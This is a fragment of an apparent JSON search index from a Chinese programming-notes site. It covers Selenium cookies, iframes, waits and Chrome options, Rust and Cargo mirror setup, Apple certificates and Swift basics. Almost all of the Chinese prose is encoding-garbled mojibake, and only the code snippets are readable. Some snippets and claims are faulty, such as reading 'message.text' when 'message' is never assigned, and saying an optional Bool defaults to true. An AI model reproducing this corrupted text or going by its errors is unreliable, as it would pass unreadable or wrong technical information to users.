å¼•å…¥å…¶æ˜¯ä¸ºäº†é˜²æ­¢CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡». Same-Site cookieå±æ€§æ¥å—ä»¥ä¸‹ä¸¤ç§å‚æ•°ä½œä¸ºæŒ‡ä»¤: Strict: å½“sameSiteå±æ€§è®¾ç½®ä¸º Strict, cookieä¸ä¼šä¸æ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™çš„è¯·æ±‚ä¸€èµ·å‘é€. Lax: å½“æ‚¨å°†cookie sameSiteå±æ€§è®¾ç½®ä¸º Lax, cookieå°†ä¸ç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·çš„GETè¯·æ±‚ä¸€èµ·å‘é€. æ³¨æ„: åˆ°ç›®å‰ä¸ºæ­¢, æ­¤åŠŸèƒ½å·²åœ¨Chrome(80+ç‰ˆæœ¬), Firefox(79+ç‰ˆæœ¬)ä¸­æä¾›, å¹¶é€‚ç”¨äºSelenium 4ä»¥åŠæ›´é«˜ç‰ˆæœ¬. ç”¨ä¾‹: from selenium import webdriver driver = webdriver.Chrome() driver.get(\"http://www.example.com\") # Adds the cookie into current browser context with sameSite 'Strict' (or) 'Lax' driver.add_cookie({\"name\": \"foo\", \"value\": \"value\", 'sameSite': 'Strict'}) driver.add_cookie({\"name\": \"foo1\", \"value\": \"value\", 'sameSite': 'Lax'}) cookie1 = driver.get_cookie('foo') cookie2 = driver.get_cookie('foo1') print(cookie1) print(cookie2) ä¸IFrameså’Œframesä¸€èµ·å·¥ä½œ æ¡†æ¶æ˜¯ä¸€ç§ç°åœ¨å·²è¢«å¼ƒç”¨çš„æ–¹æ³•ï¼Œç”¨äºä»åŒä¸€åŸŸä¸­çš„å¤šä¸ªæ–‡æ¡£æ„å»ºç«™ç‚¹å¸ƒå±€ã€‚ é™¤éä½ ä½¿ç”¨çš„æ˜¯ HTML5 ä¹‹å‰çš„ webappï¼Œå¦åˆ™ä½ ä¸å¤ªå¯èƒ½ä¸ä»–ä»¬åˆä½œã€‚ å†…åµŒæ¡†æ¶å…è®¸æ’å…¥æ¥è‡ªå®Œå…¨ä¸åŒé¢†åŸŸçš„æ–‡æ¡£ï¼Œå¹¶ä¸”ä»ç„¶ç»å¸¸ä½¿ç”¨ã€‚ å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨æ¡†æ¶æˆ– iframe, WebDriver å…è®¸æ‚¨ä»¥ç›¸åŒçš„æ–¹å¼ä½¿ç”¨å®ƒä»¬ã€‚ è€ƒè™‘ iframe ä¸­çš„ä¸€ä¸ªæŒ‰é’®ã€‚ å¦‚æœæˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨å¼€å‘å·¥å…·æ£€æŸ¥å…ƒç´ ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹: <div id=\"modal\"> <iframe id=\"buttonframe\"name=\"myframe\"src=\"https://seleniumhq.github.io\"> <button>Click here</button> </iframe> </div> å¦‚æœä¸æ˜¯ iframeï¼Œæˆ‘ä»¬å¯èƒ½ä¼šä½¿ç”¨å¦‚ä¸‹æ–¹å¼ç‚¹å‡»æŒ‰é’®: // è¿™ä¸ä¼šå·¥ä½œ driver.find_element(By.TAG_NAME, 'button').click() ä½†æ˜¯ï¼Œå¦‚æœ iframe ä¹‹å¤–æ²¡æœ‰æŒ‰é’®ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½ä¼šå¾—åˆ°ä¸€ä¸ª no such element æ— æ­¤å…ƒç´  çš„é”™è¯¯ã€‚ è¿™æ˜¯å› ä¸º Selenium åªçŸ¥é“é¡¶å±‚æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚ ä¸ºäº†ä¸æŒ‰é’®è¿›è¡Œäº¤äº’ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆ åˆ‡æ¢åˆ°æ¡†æ¶ ï¼Œ è¿™ä¸åˆ‡æ¢çª—å£çš„æ–¹å¼ç±»ä¼¼ã€‚ WebDriver æä¾›äº†ä¸‰ç§åˆ‡æ¢åˆ°å¸§çš„æ–¹æ³•ã€‚ ä½¿ç”¨ WebElement ä½¿ç”¨ WebElement è¿›è¡Œåˆ‡æ¢æ˜¯æœ€çµæ´»çš„é€‰æ‹©: # å­˜å‚¨ç½‘é¡µå…ƒç´  iframe = driver.find_element(By.CSS_SELECTOR, \"#modal > iframe\") # åˆ‡æ¢åˆ°é€‰æ‹©çš„ iframe driver.switch_to.frame(iframe) # å•å‡»æŒ‰é’® driver.find_element(By.TAG_NAME, 'button').click() ä½¿ç”¨ name æˆ– id å¦‚æœæ‚¨çš„ frame æˆ– iframe å…·æœ‰ id æˆ– name å±æ€§ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯¥å±æ€§ã€‚ å¦‚æœåç§°æˆ– id åœ¨é¡µé¢ä¸Šä¸æ˜¯å”¯ä¸€çš„ï¼Œ é‚£ä¹ˆå°†åˆ‡æ¢åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªã€‚: # é€šè¿‡ id åˆ‡æ¢æ¡†æ¶ driver.switch_to.frame('buttonframe') # å•å‡»æŒ‰é’® driver.find_element(By.TAG_NAME, 'button').click() ä½¿ç”¨ç´¢å¼• è¿˜å¯ä»¥ä½¿ç”¨frameçš„ç´¢å¼•ï¼Œ ä¾‹å¦‚å¯ä»¥ä½¿ç”¨JavaScriptä¸­çš„ window.frames è¿›è¡ŒæŸ¥è¯¢.: # åŸºäºç´¢å¼•åˆ‡æ¢åˆ°ç¬¬ 2 ä¸ª iframe iframe = driver.find_elements(By.TAG_NAME,'iframe')[1] # åˆ‡æ¢åˆ°é€‰æ‹©çš„ iframe driver.switch_to.frame(iframe) ç¦»å¼€æ¡†æ¶ ç¦»å¼€ iframe æˆ– framesetï¼Œåˆ‡æ¢å›é»˜è®¤å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤º: # åˆ‡å›åˆ°é»˜è®¤å†…å®¹ driver.switch_to.default_content() åŒçª—å£å’Œæ ‡ç­¾ä¸€èµ·å·¥ä½œ å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/windows/ çª—å£åˆ‡æ¢/å…³é—­, å±å¹•æˆªå›¾, æ‰§è¡Œè„šæœ¬ è™šæ‹Ÿèº«ä»½éªŒè¯å™¨ å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/virtual_authenticator/","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Interaction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Interaction.html"},{"title":"åŸç†/ç»“æ„","text":"Seleniumæ‰€åšçš„ä¸€åˆ‡, å°±æ˜¯å‘é€ç»™æµè§ˆå™¨å‘½ä»¤, ç”¨ä»¥æ‰§è¡ŒæŸäº›æ“ä½œæˆ–ä¸ºä¿¡æ¯å‘é€è¯·æ±‚. å¯åŠ¨ä¸€ä¸ªé©±åŠ¨å®ä¾‹: driver = webdriver.Chrome() æ‰“å¼€æŒ‡å®šçš„ç½‘é¡µ: driver.get(\"https://www.selenium.dev/selenium/web/web-form.html\") è·å–ç½‘é¡µä¿¡æ¯: title = driver.title å»ºç«‹ç­‰å¾…ç­–ç•¥ å°†ä»£ç ä¸æµè§ˆå™¨çš„å½“å‰çŠ¶æ€åŒæ­¥ æ˜¯Seleniumé¢ä¸´çš„æœ€å¤§æŒ‘æˆ˜ä¹‹ä¸€, åšå¥½å®ƒæ˜¯ä¸€ä¸ªé«˜çº§ä¸»é¢˜. åŸºæœ¬ä¸Š, æ‚¨å¸Œæœ›åœ¨å°è¯•å®šä½å…ƒç´ ä¹‹å‰, ç¡®ä¿è¯¥å…ƒç´ ä½äºé¡µé¢ä¸Š, å¹¶ä¸”åœ¨å°è¯•ä¸è¯¥å…ƒç´ äº¤äº’ä¹‹å‰, è¯¥å…ƒç´ å¤„äºå¯äº¤äº’çŠ¶æ€. éšå¼ç­‰å¾…å¾ˆå°‘æ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆ, ä½†åœ¨è¿™é‡Œæœ€å®¹æ˜“æ¼”ç¤º,: driver.implicitly_wait(0.5) å‘é€å‘½ä»¤ æŸ¥æ‰¾å…ƒç´ : text_box = driver.find_element(by=By.NAME, value=\"my-text\") submit_button = driver.find_element(by=By.CSS_SELECTOR, value=\"button\") æ“ä½œå…ƒç´ : # å¡«å…… Selenium text_box.send_keys(\"Selenium\") submit_button.click() è·å–å…ƒç´ ä¿¡æ¯: driver.find_element(by=By.ID, value=\"message\") text = message.text ç»“æŸä¼šè¯, å³ç»“æŸé©±åŠ¨ç¨‹åºè¿›ç¨‹, é»˜è®¤æƒ…å†µä¸‹, è¯¥è¿›ç¨‹ä¹Ÿä¼šå…³é—­æµè§ˆå™¨. æ— æ³•å‘æ­¤é©±åŠ¨ç¨‹åºå®ä¾‹å‘é€æ›´å¤šå‘½ä»¤: driver.quit()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html"},{"title":"æœåŠ¡","text":"Driver Service Class æœåŠ¡ç±»ç”¨äºç®¡ç†é©±åŠ¨ç¨‹åºçš„å¯åŠ¨å’Œåœæ­¢. They can not be used with a Remote WebDriver session(ä¸èƒ½ç”¨äºè¿œç¨‹ä¼šè¯). é»˜è®¤ä¼šè¯å®ä¾‹: service = webdriver.ChromeService() driver = webdriver.Chrome(service=service) è®¾ç½®ä½¿ç”¨æœ¬åœ°é©±åŠ¨: service = webdriver.ChromeService(executable_path=chromedriver_bin) æŒ‡å®šç«¯å£å¯åŠ¨: service = webdriver.ChromeService(port=1234)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Serve.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Serve.html"},{"title":"chromeæ”¯æŒçš„é€‰é¡¹","text":"ä»æŒ‡å®šä½ç½®å¯åŠ¨æµè§ˆå™¨(å³Chromeæ‰§è¡Œæ–‡ä»¶è·¯å¾„), binary å‚æ•°æ¥æ”¶ä¸€ä¸ªä½¿ç”¨æµè§ˆå™¨çš„å¤‡ç”¨è·¯å¾„, é€šè¿‡è¿™ä¸ªå‚æ•°ä½ å¯ä»¥ä½¿ç”¨chromedriver å»é©±åŠ¨å„ç§åŸºäºChromium å†…æ ¸çš„æµè§ˆå™¨.: options.binary_location = chrome_bin å¢åŠ æ’ä»¶: options.add_extension(extension_file_path) ä¿æŒæµè§ˆå™¨çš„æ‰“å¼€çŠ¶æ€ å°† detach å‚æ•°è®¾ç½®ä¸ºtrueå°†åœ¨é©±åŠ¨è¿‡ç¨‹ç»“æŸåä¿æŒæµè§ˆå™¨çš„æ‰“å¼€çŠ¶æ€: options.add_experimental_option(\"detach\", True) æ’é™¤çš„å‚æ•°, Chrome æ·»åŠ äº†å„ç§å‚æ•°ï¼Œå¦‚æœä½ ä¸å¸Œæœ›æ·»åŠ æŸäº›å‚æ•°ï¼Œ å¯ä»¥å°†å…¶ä¼ å…¥ excludeSwitches. ä¸€ä¸ªå¸¸è§çš„ä¾‹å­æ˜¯é‡æ–°æ‰“å¼€å¼¹å‡ºçª—å£é˜»æ­¢ç¨‹åº.: options.add_experimental_option('excludeSwitches', ['disable-popup-blocking']) æŒ‡å®šæ—¥å¿—è¾“å‡º: service = webdriver.ChromeService(log_output=log_path) æŒ‡å®šæ§åˆ¶å°è¾“å‡º: service = webdriver.ChromeService(log_output=subprocess.STDOUT) æŒ‡å®šæ—¥å¿—ç­‰çº§: service = webdriver.ChromeService(service_args=['--log-level=DEBUG'], log_output=subprocess.STDOUT) æŒ‡å®šæ—¥å¿—æ•ˆæœ(æ”¯æŒ append log å’Œ readable timestamps ): service = webdriver.ChromeService(service_args=['--append-log', '--readable-timestamp'], log_output=log_path) ç¦ç”¨ç‰ˆæœ¬æ£€æŸ¥, é»˜è®¤ä¼šæ£€æŸ¥é©±åŠ¨ä¸æµè§ˆå™¨çš„ç‰ˆæœ¬æ˜¯å¦ä¸€è‡´: service = webdriver.ChromeService(service_args=['--disable-build-check'], log_output=subprocess.STDOUT)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html"},{"title":"ç­‰å¾…","text":"éšå¼ç­‰å¾… å¯¹æ‰€æœ‰å…ƒç´ æœ‰æ•ˆ. ä½¿ç”¨ driver.implicitly_wait(2) æ˜¾å¼ç­‰å¾… å¯¹æŒ‡å®šå…ƒç´ æœ‰æ•ˆ. æ¯æ¬¡éƒ½éœ€è¦å»ºç«‹WebDriverWaitå¯¹è±¡: wait = WebDriverWait(driver, timeout=2) wait.until(lambda d : revealed.is_displayed()) è¿˜æ”¯æŒæ¡ä»¶è®¾ç½®: errors = [NoSuchElementException, ElementNotInteractableException] wait = WebDriverWait(driver, timeout=2, poll_frequency=.2, ignored_exceptions=errors) wait.until(lambda d : revealed.send_keys(\"Displayed\") or True)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-wait.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-wait.html"},{"title":"trio","text":"å®˜ç½‘æ–‡æ¡£:: trio è²Œä¼¼æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„å¼‚æ­¥ç¼–ç¨‹åº“, ç›¸å¯¹ asyncio æ¥è¯´, ç›®å‰æ”¯æŒçš„åº“è¿˜æ˜¯æ¯”è¾ƒå°‘çš„, ä¸è¿‡ PySide6 æ–‡æ¡£ä¸­ä¸¾ä¾‹ä½¿ç”¨äº†è¿™ä¸ªåº“. åé¢æœ‰ç©ºå†è¡¥å…….","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-trio.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-trio.html"},{"title":"yarl","text":"ä¸€ä¸ªURLå¤„ç†çš„æ¨¡å—, ç±»ä¼¼Vscodeçš„\"URI\"æ¨¡å—","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-yarl.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-yarl.html"},{"title":"Rust","text":"å®‰è£…å‚è€ƒ: https://rustup.rs/ å›½å†…æºé…ç½® Mac æ›´æ–°é…ç½®æ–‡ä»¶: vim ~/.bash_profile æ–°å¢å¦‚ä¸‹å†…å®¹(ä½¿ç”¨ä¸­ç§‘å¤§ä»£ç†): export RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static export RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup # ä½¿ç”¨ rsproxy ä»£ç† # export RUSTUP_DIST_SERVER=\"https://rsproxy.cn\" # export RUSTUP_UPDATE_ROOT=\"https://rsproxy.cn/rustup\" è®©ä¿®æ”¹ç”Ÿæ•ˆ: source ~/.bash_profile Windows10 è®¾ç½®å¦‚ä¸‹ç¯å¢ƒå˜é‡: RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup å‡çº§ code: rustup check rustup update é…ç½® Cargo ä½¿ç”¨å›½å†…é•œåƒ æ›´æ–°æ–‡ä»¶ ~/.cargo/config`ï¼ˆwindows 10 ä¸‹ä¸º `C:Users<ç”¨æˆ·å>.cargoconfig ï¼‰ï¼Œ æ²¡æœ‰å°±æ–°å»º: [source.crates-io] registry = \"https://github.com/rust-lang/crates.io-index\" # æ›¿æ¢æˆè¦ä½¿ç”¨çš„é•œåƒ replace-with = 'rsproxy' # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ [source.ustc] registry = \"git://mirrors.ustc.edu.cn/crates.io-index\" # å¦‚æœæ‰€å¤„çš„ç¯å¢ƒä¸­ä¸å…è®¸ä½¿ç”¨ git åè®®ï¼Œå¯ä»¥æŠŠä¸Šè¿°åœ°å€æ”¹ä¸º https åè®® #registry = \"https://mirrors.ustc.edu.cn/crates.io-index\" # æ¸…åå¤§å­¦ [source.tuna] registry = \"https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git\" # ä¸Šæµ·äº¤é€šå¤§å­¦ [source.sjtu] registry = \"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index\" # rustcc ç¤¾åŒº [source.rustcc] registry = \"git://crates.rustcc.cn/crates.io-index\" # rsproxy [source.rsproxy] registry = \"https://rsproxy.cn/crates.io-index\" [source.rsproxy-sparse] registry = \"sparse+https://rsproxy.cn/index/\" [registries.rsproxy] index = \"https://rsproxy.cn/crates.io-index\" [net] git-fetch-with-cli=true è‹¥ ä½¿ç”¨ cargo build å‘½ä»¤ä»ç„¶æŠ¥é”™å¦‚ä¸‹é”™è¯¯: blocking waiting for file lock on package(åŒ…) cache lock å¯åˆ é™¤æ–‡ä»¶ ~/.cargo/.package-cache ç„¶åé‡è¯•ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-rust-index.html","loc":"/yq-doc-source-docs-rear-end-rust-index.html"},{"title":"Appleè¯ä¹¦ç±»å‹","text":"å¼€å‘çš„è®¾å¤‡è¦åœ¨å…¶ä»–è®¾å¤‡ä¸Šè¿è¡Œ, éœ€è¦æœ‰è¯ä¹¦ å®è§‚æ¥è¯´æœ‰ä¸¤ç§ Appleå¼€å‘: æ™®é€šçš„å¸¦è¯ä¹¦çš„æœ¬åœ°å¼€å‘, ç›´æ¥ä½¿ç”¨è‡ªå·±è´¦æˆ·ç™»é™†, è¯ä¹¦é€‰æ‹©å¼€å‘è€…, å°±ä¼šé»˜è®¤ç”Ÿæˆä¸€ä¸ªå¯ç”¨çš„è¯ä¹¦(å…è´¹, æœ‰æ•ˆæœŸä¸€å¹´), è¿‡æœŸäº†å†é‡å¤å³å¯, Appleåˆ†å‘: ç”¨äºåœ¨å…¶ä»–è®¾å¤‡è¿è¡Œ, å‘å¸ƒåˆ°Apple Store, ä¸ªäººè´¦å·688/y å‚è€ƒ: Appleå®˜ç½‘-è¯ä¹¦ Appleå®˜ç½‘-è¯ä¹¦ç±»å‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Apple-certificate-type.html","loc":"/yq-doc-source-docs-rear-end-swift-Apple-certificate-type.html"},{"title":"å¸¸è§å±æ€§åŒ…è£…å™¨","text":"@State . @StateObject @StateObjectå±æ€§åŒ…è£…å™¨ä¸ç±»ä¼¼@Stateï¼Œåªä¸è¿‡å®ƒé€‚ç”¨äºObservableObjectã€‚ ä¸€ä¸ªObservableObjectå§‹ç»ˆæ˜¯å¼•ç”¨ç±»å‹ (class)ï¼Œå¹¶ä¸”æ¯å½“å…¶@Publishedå±æ€§ä¹‹ä¸€å‘ç”Ÿæ›´æ”¹æ—¶éƒ½ä¼šé€šçŸ¥ã€‚ @Binding . @ObservedObject ä»¥ä¾¿è§†å›¾å¯ä»¥è§‚å¯Ÿå¤–éƒ¨å¯¹è±¡çš„çŠ¶æ€ï¼Œå¹¶åœ¨é‡è¦å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶æ”¶åˆ°é€šçŸ¥ã€‚ @Published å…è®¸æˆ‘ä»¬åˆ›å»ºå¯è§‚å¯Ÿçš„å¯¹è±¡ï¼Œå¹¶ä¸”åœ¨å‘ç”Ÿæ›´æ”¹æ—¶è§¦å‘è§†å›¾é‡ç»˜ã€‚æˆ‘ä»¬ç»å¸¸å°†@Publishedä¸ObservableObjectåè®®ç»“åˆä½¿ç”¨ã€‚ æ­¤éƒ¨åˆ†å¯å‚è€ƒ: https://juejin.cn/post/7319706549915156499","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Attribute-packaging.html","loc":"/yq-doc-source-docs-rear-end-swift-Attribute-packaging.html"},{"title":"åŸºæœ¬è¯­æ³•","text":"å¸¸è¯†äº†è§£ Swift Playground å¯è§†ä¸ºä¸€ä¸ªå¯äº¤äº’çš„æ–‡æ¡£ï¼Œ æ‰€å†™å³æ‰€å¾— å†…ç½®å…³é”®å­— let å¸¸é‡å®šä¹‰ var å˜é‡å®šä¹‰ print æ‰“å°è¾“å‡º typealias å®šä¹‰ç±»å‹åˆ«å å¦‚å®šä¹‰äº† Int çš„ç±»å‹åˆ«åä¸º Feet: typealias Feet = Int guard guardè¯­å¥å’Œifè¯­å¥æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯æ ¹æ®å…¶å…³é”®å­—ä¹‹åçš„è¡¨è¾¾å¼çš„å¸ƒå°”å€¼å†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œä»€ä¹ˆã€‚ ä½†ä¸ifè¯­å¥ä¸åŒçš„æ˜¯ï¼Œguardè¯­å¥åªä¼šæœ‰ä¸€ä¸ªä»£ç å—ï¼Œä¸åƒifè¯­å¥å¯ä»¥if elseå¤šä¸ªä»£ç å—ã€‚ é‚£ä¹ˆguardè¯­å¥çš„ä½œç”¨åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å®ˆæŠ¤ã€‚ guardè¯­å¥åˆ¤æ–­å…¶åçš„è¡¨è¾¾å¼å¸ƒå°”å€¼ä¸ºfalseæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¹‹åä»£ç å—é‡Œçš„ä»£ç ï¼Œ å¦‚æœä¸ºtrueï¼Œåˆ™è·³è¿‡æ•´ä¸ªguardè¯­å¥: // æ£€æŸ¥èº«ä»½è¯ï¼Œå¦‚æœèº«ä»½è¯æ²¡å¸¦ï¼Œåˆ™ä¸èƒ½è¿›å…¥è€ƒåœº guard let id = person[\"id\"] else { print(\"æ²¡æœ‰èº«ä»½è¯ï¼Œä¸èƒ½è¿›å…¥è€ƒåœº!\") return } å†…ç½®æ•°æ®ç±»å‹ Int æ•´å‹ UInt æ— ç¬¦å·æ•´å‹ å°½é‡ä¸è¦ä½¿ç”¨UIntï¼Œé™¤éä½ çœŸçš„éœ€è¦å­˜å‚¨ä¸€ä¸ªå’Œå½“å‰å¹³å°åŸç”Ÿå­—é•¿ç›¸åŒçš„æ— ç¬¦å·æ•´æ•°ã€‚ é™¤äº†è¿™ç§æƒ…å†µï¼Œæœ€å¥½ä½¿ç”¨Intï¼Œå³ä½¿ä½ è¦å­˜å‚¨çš„å€¼å·²çŸ¥æ˜¯éè´Ÿçš„ã€‚ ç»Ÿä¸€ä½¿ç”¨Intå¯ä»¥æé«˜ä»£ç çš„å¯å¤ç”¨æ€§ï¼Œé¿å…ä¸åŒç±»å‹æ•°å­—ä¹‹é—´çš„è½¬æ¢ï¼Œå¹¶ä¸”åŒ¹é…æ•°å­—çš„ç±»å‹æ¨æ–­ã€‚ æ³¨è§£ æ•´æ•°ç±»å‹éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨ 32 ä½ç³»ç»Ÿä¸Š, Int å’Œ Int32 é•¿åº¦ç›¸åŒã€‚ åœ¨ 64 ä½ç³»ç»Ÿä¸Š, Int å’Œ Int64 é•¿åº¦ç›¸åŒã€‚ åœ¨ 32 ä½ç³»ç»Ÿä¸Š, UInt å’Œ UInt32 é•¿åº¦ç›¸åŒã€‚ åœ¨ 64 ä½ç³»ç»Ÿä¸Š, UInt å’Œ UInt64 é•¿åº¦ç›¸åŒã€‚ Int8, Int16, Int32, Int64 åˆ†åˆ«è¡¨ç¤º 8 ä½, 16 ä½, 32 ä½, å’Œ 64 ä½çš„æœ‰ç¬¦å·æ•´æ•°å½¢å¼ã€‚ UInt8, UInt16, UInt32, UInt64 åˆ†åˆ«è¡¨ç¤º 8 ä½, 16 ä½, 32 ä½ å’Œ 64 ä½çš„æ— ç¬¦å·æ•´æ•°å½¢å¼ã€‚ Float 32æµ®ç‚¹æ•°ï¼Œç²¾åº¦è¦æ±‚ä¸é«˜çš„è¯å¯ä»¥ä½¿ç”¨æ­¤ç±»å‹ã€‚ æµ®ç‚¹ç±»å‹æ¯”æ•´æ•°ç±»å‹è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œå¯ä»¥å­˜å‚¨æ¯” Int ç±»å‹æ›´å¤§æˆ–è€…æ›´å°çš„æ•°å­— Double 64ä½æµ®ç‚¹æ•°ï¼Œå½“ä½ éœ€è¦å­˜å‚¨å¾ˆå¤§æˆ–è€…å¾ˆé«˜ç²¾åº¦çš„æµ®ç‚¹æ•°æ—¶è¯·ä½¿ç”¨æ­¤ç±»å‹ã€‚ æ³¨è§£ Doubleç²¾ç¡®åº¦å¾ˆé«˜ï¼Œè‡³å°‘æœ‰15ä½æ•°å­—ï¼Œ è€Œ Float æœ€å°‘åªæœ‰6ä½æ•°å­—ã€‚ é€‰æ‹©å“ªä¸ªç±»å‹å–å†³äºä½ çš„ä»£ç éœ€è¦å¤„ç†çš„å€¼çš„èŒƒå›´ã€‚ Bool å¸ƒå°”å€¼ åŸºæœ¬çš„å¸ƒå°”ï¼ˆBooleanï¼‰ç±»å‹ï¼Œå«åš Boolã€‚å¸ƒå°”å€¼æŒ‡é€»è¾‘ä¸Šçš„å€¼ï¼Œå› ä¸ºå®ƒä»¬åªèƒ½æ˜¯çœŸæˆ–è€…å‡ã€‚ Swift æœ‰ä¸¤ä¸ªå¸ƒå°”å¸¸é‡ï¼Œtrue å’Œ falseã€‚ String å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„åºåˆ—é›†åˆ Character å­—ç¬¦æŒ‡çš„æ˜¯å•ä¸ªå­—æ¯ Optional ä½¿ç”¨å¯é€‰ç±»å‹æ¥å¤„ç†å€¼å¯èƒ½ç¼ºå¤±çš„æƒ…å†µã€‚å¯é€‰ç±»å‹è¡¨ç¤ºæœ‰å€¼æˆ–æ²¡æœ‰å€¼ã€‚ å¦‚ä»¥ä¸‹ä¸¤ç§å£°æ˜ç›¸ç­‰: var optionalInteger: Int? var optionalInteger: Optional<Int> å½“ä½ å£°æ˜ä¸€ä¸ªå¯é€‰å˜é‡æˆ–è€…å¯é€‰å±æ€§çš„æ—¶å€™æ²¡æœ‰æä¾›åˆå§‹å€¼ï¼Œå®ƒçš„å€¼ä¼šé»˜è®¤ä¸º nil è‹¥ä¸ºå¸ƒå°”ï¼Œ è²Œä¼¼é»˜è®¤ä¸ºtrue å¦‚æœä¸€ä¸ªå¯é€‰ç±»å‹çš„å®ä¾‹åŒ…å«ä¸€ä¸ªå€¼ï¼Œä½ å¯ä»¥ç”¨åç¼€æ“ä½œç¬¦ ï¼æ¥è®¿é—®è¿™ä¸ªå€¼: optionalInteger = 42 optionalInteger! // 42 å½“ä½ ç¡®å®šå¯é€‰ç±»å‹ç¡®å®åŒ…å«å€¼ä¹‹åï¼Œä½ å¯ä»¥åœ¨å¯é€‰çš„åå­—åé¢åŠ ä¸€ä¸ªæ„Ÿå¹å·ï¼ˆ!ï¼‰æ¥è·å–å€¼ï¼Œ è¿™è¢«ç§°ä¸ºå¯é€‰å€¼çš„ å¼ºåˆ¶è§£æï¼ˆforced unwrappingï¼‰ è¿™éƒ¨åˆ†(é—®å·/å¹å·)çš„ä½¿ç”¨, ä¸tsåŸºæœ¬ä¸€è‡´ æ³¨è§£ ä½¿ç”¨!æ¥è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„å¯é€‰å€¼ä¼šå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ã€‚ ä½¿ç”¨!æ¥å¼ºåˆ¶è§£æå€¼ä¹‹å‰ï¼Œä¸€å®šè¦ç¡®å®šå¯é€‰åŒ…å«ä¸€ä¸ªénilçš„å€¼ã€‚ å¯é€‰ç»‘å®š ä½¿ç”¨å¯é€‰ç»‘å®šï¼ˆoptional bindingï¼‰æ¥åˆ¤æ–­å¯é€‰ç±»å‹æ˜¯å¦åŒ…å«å€¼ï¼Œ å¦‚æœåŒ…å«å°±æŠŠå€¼èµ‹ç»™ä¸€ä¸ªä¸´æ—¶å¸¸é‡æˆ–è€…å˜é‡ã€‚ å¯é€‰ç»‘å®šå¯ä»¥ç”¨åœ¨ifå’Œwhileè¯­å¥ä¸­æ¥å¯¹å¯é€‰ç±»å‹çš„å€¼è¿›è¡Œåˆ¤æ–­å¹¶æŠŠå€¼èµ‹ç»™ä¸€ä¸ªå¸¸é‡æˆ–è€…å˜é‡ã€‚ å®ä¾‹: import Cocoa var myString:String? myString = \"Hello, Swift!\" if let yourString = myString { print(\"ä½ çš„å­—ç¬¦ä¸²å€¼ä¸º - \\(yourString)\") }else{ print(\"ä½ çš„å­—ç¬¦ä¸²æ²¡æœ‰å€¼\") } ä»¥ä¸Šç¨‹åºæ‰§è¡Œç»“æœä¸º: ä½ çš„å­—ç¬¦ä¸²å€¼ä¸º - Hello, Swift! Array todo Dictionary todo Struct todo Class todo ç±»å‹å®‰å…¨ Swift æ˜¯ä¸€ä¸ªç±»å‹å®‰å…¨ï¼ˆtype safeï¼‰çš„è¯­è¨€ã€‚ ç”±äº Swift æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œ æ‰€ä»¥å®ƒä¼šåœ¨ç¼–è¯‘ä½ çš„ä»£ç æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼ˆtype checksï¼‰ï¼Œå¹¶æŠŠä¸åŒ¹é…çš„ç±»å‹æ ‡è®°ä¸ºé”™è¯¯ã€‚ è¿™å¯ä»¥è®©ä½ 